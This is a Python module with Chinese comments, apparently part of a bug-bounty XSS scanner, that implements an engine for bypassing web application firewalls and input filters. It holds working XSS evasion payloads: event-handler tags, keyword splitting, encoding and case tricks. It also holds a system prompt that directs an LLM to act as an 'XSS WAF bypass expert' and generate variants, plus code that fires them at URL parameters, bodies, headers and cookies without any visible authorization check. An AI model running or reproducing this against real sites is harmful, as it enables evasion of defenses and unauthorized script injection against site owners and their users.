"""
LLM 动态 WAF/Filter 绕过 — P0 关键差异化能力。

真实赏金场景中很多 XSS 都是"过滤了 <script> 但漏了 <svg>"、"过滤了 alert 但漏了 console.log" 这类。
传统扫描器只能跑固定字典，而我们用 LLM 实时根据"被过滤的内容"生成针对性绕过 payload。

工作流：
1. 探测阶段：用 payload 集合发请求，收集每个 payload 的"过滤指纹"
   - 哪些字符被替换/删除？
   - 哪些关键字被替换为空？
   - WAF 拦截响应有哪些特征（403、特定文案）？
2. 把指纹 + 原始 payload 喂给 LLM
3. LLM 生成 3-5 个绕过变种
4. 把变种重新发到注入点验证
5. 命中后升级置信度

也支持纯启发式绕过（无 LLM 时降级）：
- 大小写混淆
- 双重编码
- 注释拆分
- 不常见标签变体
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
import string
import time
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse, parse_qsl, urlencode

import httpx

from core.xss.context import detect_context, detect_sanitization
from core.xss.http_engine import _gen_marker
from core.xss.models import (
    ContextType,
    InjectionPoint,
    InjectionTarget,
    XssCandidate,
    XssType,
)
from core.xss.payloads import MARKER

if TYPE_CHECKING:
    from core.llm import LLMClient

log = logging.getLogger(__name__)


# ============================================================
# 启发式绕过 payload 生成（无 LLM 时使用）
# ============================================================
def _generate_heuristic_bypass(original_payload: str, filtered_chars: list, marker: str) -> list[str]:
    """根据过滤情况生成启发式变种。"""
    variants: list[str] = []

    # 1. 如果 < 被过滤 → 试 \u003c, %3c, &lt;
    if "<" in filtered_chars:
        variants.append(original_payload.replace("<", "\\u003c"))
        variants.append(original_payload.replace("<", "&lt;"))
        # 试纯 JS：javascript: URL
        variants.append(f"javascript:alert({marker})")

    # 2. 如果 script 被过滤 → 试其他标签
    low = original_payload.lower()
    if "<script" in low and "script" in low:
        for tag in ["svg", "img", "video", "audio", "iframe", "details", "marquee", "body"]:
            if tag in low:
                continue
            if tag == "svg":
                variants.append(f"<svg/onload=alert({marker})>")
            elif tag == "img":
                variants.append(f"<img src=x onerror=alert({marker})>")
            elif tag == "iframe":
                variants.append(f"<iframe src=javascript:alert({marker})>")
            elif tag == "details":
                variants.append(f"<details open ontoggle=alert({marker})>")

    # 3. 如果 alert 被过滤 → 试其他 sink
    if "alert" in original_payload.lower():
        variants.append(original_payload.replace("alert", "confirm"))
        variants.append(original_payload.replace("alert", "prompt"))
        variants.append(original_payload.replace("alert", "console.log"))
        # 编码绕过
        variants.append(original_payload.replace("alert", "top['al'+'ert']"))
        variants.append(original_payload.replace("alert", "window['\\x61lert']"))
        # eval 模式
        variants.append(original_payload.replace(
            f"alert({marker})", f"eval('al'+'ert({marker})')"
        ))

    # 4. 大小写混淆
    if "<svg" in low or "<script" in low or "<img" in low:
        # 全混淆
        mixed = ""
        for c in original_payload:
            if c.isalpha() and random.random() > 0.5:
                mixed += c.upper() if c.islower() else c.lower()
            else:
                mixed += c
        variants.append(mixed)

    # 5. 注释插入（绕过简单 keyword 匹配）
    if "onerror" in low:
        variants.append(original_payload.replace("onerror", "on/**/error"))
    if "onload" in low:
        variants.append(original_payload.replace("onload", "on/**/load"))

    # 6. 双引号 → 反引号（JS 上下文）
    if '"' in original_payload:
        variants.append(original_payload.replace('"', "`"))

    # 7. 空格 → tab/换行
    if " " in original_payload:
        variants.append(original_payload.replace(" ", "\t"))
        variants.append(original_payload.replace(" ", "\n"))
        variants.append(original_payload.replace(" ", "/"))

    # 去重
    seen: set[str] = set()
    out: list[str] = []
    for v in variants:
        if v and v not in seen and v != original_payload:
            seen.add(v)
            out.append(v)
    return out[:8]  # 最多 8 个变种


# ============================================================
# LLM 驱动的智能绕过
# ============================================================
LLM_BYPASS_SYSTEM_PROMPT = """你是 XSS WAF 绕过专家。任务：根据"被过滤的特征"生成针对性的绕过 payload。

输入信息：
- 原始 payload
- 在响应中被过滤的字符
- 被编码的字符
- 是否完全被拦截（响应状态码、关键字）
- 回显上下文（HTML/JS/属性）
- marker 字符串（必须保留在变种中，扫描器用它识别命中）

输出规则：
1. 输出 5-8 个候选 payload，每个都包含 marker
2. 不要重复原 payload，要真的能绕过观察到的过滤
3. 不同绕过技巧覆盖：标签变体、编码、大小写、关键字替换、上下文逃逸、JS 编码
4. 不要使用过期/不能在现代浏览器执行的技巧（如 expression()）
5. 严格输出 JSON 数组（字符串列表），不要其他文本

示例输出：
```json
[
  "<svg/onload=alert(MARKER)>",
  "<img src=x onerror=alert(MARKER)>",
  "<iframe srcdoc=\\"<svg onload=alert(MARKER)>\\">",
  "<svg><script>al\\u0065rt(MARKER)</script>",
  "javascript:alert(MARKER)"
]
```
"""


async def _llm_generate_bypass(
    llm: "LLMClient",
    original_payload: str,
    marker: str,
    context: str,
    sanitization: dict,
    blocked: bool = False,
) -> list[str]:
    """调用 LLM 生成绕过变种。"""
    user_msg = (
        f"原始 payload: {original_payload}\n\n"
        f"marker (必须保留在变种中): {marker}\n\n"
        f"回显上下文 context: {context}\n\n"
        f"沙化情况:\n"
        f"  - 被完全过滤的字符: {sanitization.get('filtered', [])}\n"
        f"  - 被编码的字符: {sanitization.get('encoded', {})}\n"
        f"  - 保留完整的字符: {sanitization.get('intact_chars', [])}\n"
        f"  - 整个被 WAF 拦截: {blocked}\n\n"
        "请生成 5-8 个针对性的绕过 payload（JSON 数组格式）。"
    )

    try:
        from core.llm import Message
        messages = [
            Message(role="system", content=LLM_BYPASS_SYSTEM_PROMPT),
            Message(role="user", content=user_msg),
        ]
        response = await asyncio.to_thread(
            llm.chat, messages, caller="xss_waf_bypass",
        )
        text = response.content or ""
    except Exception as e:
        log.debug("LLM bypass call failed: %s", e)
        return []

    # 提取 JSON 数组
    import re
    m = re.search(r'\[[\s\S]*\]', text)
    if not m:
        return []
    try:
        arr = json.loads(m.group(0))
        if not isinstance(arr, list):
            return []
        # 验证每个变种含 marker
        out = []
        for p in arr:
            if isinstance(p, str) and marker in p and p != original_payload:
                out.append(p)
        return out[:10]
    except Exception:
        return []


class WafBypassEngine:
    """WAF/Filter 动态绕过引擎。"""

    def __init__(
        self,
        llm: Optional["LLMClient"] = None,
        proxy: str = "",
        timeout: float = 15.0,
        max_variants: int = 6,
        on_progress: Optional[callable] = None,
        enable_llm: bool = True,
    ):
        self.llm = llm
        self.proxy = proxy or None
        self.timeout = timeout
        self.max_variants = max_variants
        self.on_progress = on_progress
        self.enable_llm = enable_llm and llm is not None
        self._stats = {"attempts": 0, "hits": 0}

    def _report(self, msg: str):
        if self.on_progress:
            try:
                self.on_progress(msg)
            except Exception:
                pass

    async def bypass_filtered_candidates(
        self,
        filtered_results: list[dict],  # 每个 dict: {target, payload, marker, sanitization, body_resp_status}
    ) -> list[XssCandidate]:
        """对每个被过滤的注入尝试绕过。

        Args:
            filtered_results: 来自 http_engine 探测阶段，发现被过滤但有回显的目标
        """
        if not filtered_results:
            return []

        self._report(f"🛡️ WAF Bypass 启动: 对 {len(filtered_results)} 个被过滤目标生成变种")
        new_candidates: list[XssCandidate] = []
        sem = asyncio.Semaphore(4)

        async with httpx.AsyncClient(
            proxy=self.proxy, timeout=self.timeout, verify=False,
            follow_redirects=False, limits=httpx.Limits(max_connections=10),
        ) as client:

            async def _bypass_one(item: dict):
                async with sem:
                    try:
                        c = await self._bypass_single(client, item)
                        if c:
                            new_candidates.extend(c)
                    except Exception as e:
                        log.debug("waf bypass error: %s", e)

            await asyncio.gather(*[_bypass_one(it) for it in filtered_results])

        self._report(
            f"✅ WAF Bypass 完成: {self._stats['attempts']} 次尝试, 命中 {self._stats['hits']} 个"
        )
        return new_candidates

    async def _bypass_single(self, client: httpx.AsyncClient, item: dict) -> list[XssCandidate]:
        """对单个被过滤的目标生成 + 测试变种。"""
        tgt: InjectionTarget = item["target"]
        orig_payload: str = item.get("payload", "")
        orig_marker: str = item.get("marker", "")
        sanitization: dict = item.get("sanitization", {})
        blocked: bool = item.get("blocked", False)
        context: str = item.get("context", "html_text")

        # 生成变种（启发式 + LLM）
        variants: list[str] = []
        # 启发式（先用，快）— 用原 marker（用占位 MARKER）
        variants.extend(_generate_heuristic_bypass(orig_payload, sanitization.get("filtered", []), orig_marker))

        # LLM（如启用）
        if self.enable_llm and self.llm:
            try:
                llm_variants = await _llm_generate_bypass(
                    self.llm, orig_payload, orig_marker, context, sanitization, blocked,
                )
                variants.extend(llm_variants)
            except Exception as e:
                log.debug("LLM bypass failed: %s", e)

        # 去重 + 限量
        seen: set[str] = set()
        uniq: list[str] = []
        for v in variants:
            if v and v not in seen:
                seen.add(v)
                uniq.append(v)
        uniq = uniq[: self.max_variants]

        if not uniq:
            return []

        # 测每个变种
        out: list[XssCandidate] = []
        for variant in uniq:
            self._stats["attempts"] += 1
            # 每个变种用新 marker（同 base 不同后缀）
            new_marker = _gen_marker("b")
            real_payload = variant.replace(orig_marker, new_marker)
            try:
                req_text, resp = await self._send_payload(client, tgt, real_payload)
                if not resp:
                    continue
                body = resp.text or ""
                if new_marker not in body:
                    continue
                echo_matches = detect_context(body, new_marker)
                if not echo_matches:
                    continue
                # 检查关键字符是否还在
                new_san = detect_sanitization(real_payload, body, new_marker)
                intact = new_san.get("intact_chars", [])
                # 如果 < > ( ) 都过了，置信度高
                if "<" in intact and ">" in intact:
                    confidence = 0.85
                elif not all(m.encoded for m in echo_matches):
                    confidence = 0.7
                else:
                    confidence = 0.5

                cand = XssCandidate(
                    target=tgt,
                    payload=real_payload,
                    marker=new_marker,
                    echo_matches=echo_matches,
                    confidence=confidence,
                    xss_type=XssType.REFLECTED,
                    request_packet=req_text[:8000],
                    response_packet=body[:30000],
                    response_status=resp.status_code,
                    response_content_type=resp.headers.get("content-type", ""),
                    scanner="xss_waf_bypass",
                )
                out.append(cand)
                self._stats["hits"] += 1
                # 一个变种命中即停（避免重复）
                break
            except Exception:
                continue
        return out

    async def _send_payload(
        self, client: httpx.AsyncClient, tgt: InjectionTarget, payload: str
    ) -> tuple[str, Optional[httpx.Response]]:
        """复用 http_engine 的发送逻辑（精简版）。"""
        method = tgt.method.upper()
        headers = dict(tgt.headers or {})
        headers.pop("Content-Length", None)
        headers.pop("content-length", None)

        if tgt.injection_point == InjectionPoint.URL_PARAM:
            parsed = urlparse(tgt.url)
            existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
            existing[tgt.param_name] = payload
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(existing)}"
            try:
                resp = await client.request(method, new_url, headers=headers)
                return f"{method} {new_url}", resp
            except Exception:
                return "", None

        if tgt.injection_point == InjectionPoint.BODY_FORM:
            try:
                resp = await client.request(
                    method, tgt.url, headers=headers,
                    data={tgt.param_name: payload}
                )
                return f"{method} {tgt.url} (form)", resp
            except Exception:
                return "", None

        if tgt.injection_point == InjectionPoint.BODY_JSON:
            obj = {}
            try:
                if tgt.body_template:
                    obj = json.loads(tgt.body_template)
            except Exception:
                obj = {}
            if not isinstance(obj, dict):
                obj = {}
            obj[tgt.param_name] = payload
            headers.setdefault("Content-Type", "application/json")
            try:
                resp = await client.request(method, tgt.url, headers=headers,
                                            content=json.dumps(obj))
                return f"{method} {tgt.url} (json)", resp
            except Exception:
                return "", None

        if tgt.injection_point == InjectionPoint.HEADER:
            headers[tgt.param_name] = payload
            try:
                resp = await client.request(method, tgt.url, headers=headers)
                return f"{method} {tgt.url} ({tgt.param_name} header)", resp
            except Exception:
                return "", None

        if tgt.injection_point == InjectionPoint.COOKIE:
            cookies = {tgt.param_name: payload}
            try:
                resp = await client.request(method, tgt.url, headers=headers, cookies=cookies)
                return f"{method} {tgt.url} ({tgt.param_name} cookie)", resp
            except Exception:
                return "", None

        return "", None
